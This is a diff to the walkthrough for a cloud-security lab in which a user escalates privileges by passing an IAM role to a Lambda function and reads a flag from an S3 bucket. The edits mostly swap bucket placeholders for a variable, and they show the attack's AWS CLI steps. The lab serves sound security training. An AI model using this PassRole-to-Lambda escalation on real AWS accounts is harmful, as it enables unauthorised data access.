@@ -8,7 +8,7 @@ This pattern shows up in real environments when developers are given broad Lambd
 
 ## The Challenge
 
-You start as the IAM user `pl-prod-lambda-006-to-bucket-starting-user`. Your credentials are available from the Terraform outputs after deploying this scenario. The target is the S3 bucket `pl-prod-lambda-006-to-bucket-{account_id}-{suffix}`, which contains `flag.txt`.
+You start as the IAM user `pl-prod-lambda-006-to-bucket-starting-user`. Your credentials are available from the Terraform outputs after deploying this scenario. The target is the S3 bucket `pl-prod-lambda-006-to-bucket-{account_id}-{suffix}`, which contains `flag.txt`. The hosted platform gives the bucket a per-deployment name: open the **Outputs** tab next to your terminal and copy the `target_bucket_name` output. You will use it as `TARGET_BUCKET` in the steps below.
 
 Your starting user has these permissions:
 - `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-lambda-006-to-bucket-target-role`
@@ -29,7 +29,8 @@ aws sts get-caller-identity
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 
 # Confirm no direct S3 access
-aws s3 ls s3://pl-prod-lambda-006-to-bucket-${ACCOUNT_ID}-<suffix>
+TARGET_BUCKET=<paste the target_bucket_name output here>
+aws s3 ls s3://${TARGET_BUCKET}
 # Should fail with AccessDenied
 ```
 
@@ -39,9 +40,9 @@ If you have the helpful `iam:ListRoles` permission, discover the target role:
 aws iam list-roles --query 'Roles[?contains(RoleName, `lambda-006-to-bucket`)].{Name:RoleName,Arn:Arn}'
 ```
 
-You are looking for `pl-prod-lambda-006-to-bucket-target-role`. A quick `iam:GetRolePolicy` or `iam:ListAttachedRolePolicies` call against it will confirm it has S3 access to the target bucket.
+You are looking for `pl-prod-lambda-006-to-bucket-target-role`. `iam:ListRoles` is the only IAM read verb your user holds, so the role-policy inspection calls are not yours to run — `iam:GetRolePolicy` and `iam:ListAttachedRolePolicies` both deny, and that is the lab's containment, not a broken step.
 
-Note the bucket name from the Terraform outputs — you will need it when invoking the Lambda function. It follows the pattern `pl-prod-lambda-006-to-bucket-{account_id}-{suffix}`.
+Note the bucket name — you will need it when invoking the Lambda function. The pattern is `pl-prod-lambda-006-to-bucket-{account_id}-{suffix}`, and your deployment's exact name is the `target_bucket_name` output on the player's **Outputs** tab, already captured as `TARGET_BUCKET` above.
 
 ## Exploitation
 
@@ -138,11 +139,11 @@ aws lambda wait function-active --function-name pl-lambda-006-to-bucket-escalati
 Pass the bucket name in the event payload so the function knows where to look for `flag.txt`:
 
 ```bash
-BUCKET_NAME="pl-prod-lambda-006-to-bucket-${ACCOUNT_ID}-<suffix>"
+TARGET_BUCKET=<paste the target_bucket_name output here>
 
 aws lambda invoke \
   --function-name "pl-lambda-006-to-bucket-escalation" \
-  --payload "{\"bucket\": \"${BUCKET_NAME}\"}" \
+  --payload "{\"bucket\": \"${TARGET_BUCKET}\"}" \
   /tmp/lambda_output.json
 
 cat /tmp/lambda_output.json
@@ -170,7 +171,8 @@ You should see the flag value printed to stdout. The Lambda function executed as
 The flag is the contents of `flag.txt` in the target S3 bucket, which you just extracted from the Lambda response above. For `to-bucket` scenarios, the canonical retrieval command reads the object directly from S3. Using the Lambda execution role's access path, this is equivalent to:
 
 ```bash
-aws s3 cp s3://pl-prod-lambda-006-to-bucket-${ACCOUNT_ID}-<suffix>/flag.txt -
+aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
+# An error occurred (AccessDenied) -- as the starting user; only the execution role holds s3:GetObject
 ```
 
 In this scenario the starting user cannot run that command directly (no `s3:GetObject`), but the Lambda function running as the target role can — and it already returned the value in the invocation response. The flag value printed from `/tmp/lambda_output.json` in the previous step is your submission. The exact value is deployment-specific; the retrieval mechanism is the same across all to-bucket scenarios.
